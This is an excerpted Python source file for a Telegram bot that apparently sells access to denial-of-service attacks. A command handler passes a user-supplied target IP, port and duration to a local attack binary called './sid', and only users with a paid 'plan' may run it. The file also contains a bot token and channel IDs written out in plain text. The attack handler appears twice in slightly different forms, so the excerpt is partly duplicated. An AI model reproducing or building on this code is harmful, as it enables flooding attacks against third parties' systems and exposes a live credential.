...
TOKEN = '7709240465:AAEOxLrt1EQA4DuvyadfSh5Zwo5RDSPzvw0'
...
FORWARD_CHANNEL_ID = -1002181997083
CHANNEL_ID = -1002181997083
error_channel_id = -1002181997083
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./sid {target_ip} {target_port} {duration} 30")
...
def attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator @Mr_sid_001")
            return
...
def attack_command(message):
    ...
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*You are not approved to use this bot. Please contact the administrator  @Mr_sid_001*", parse_mode='Markdown')
            return
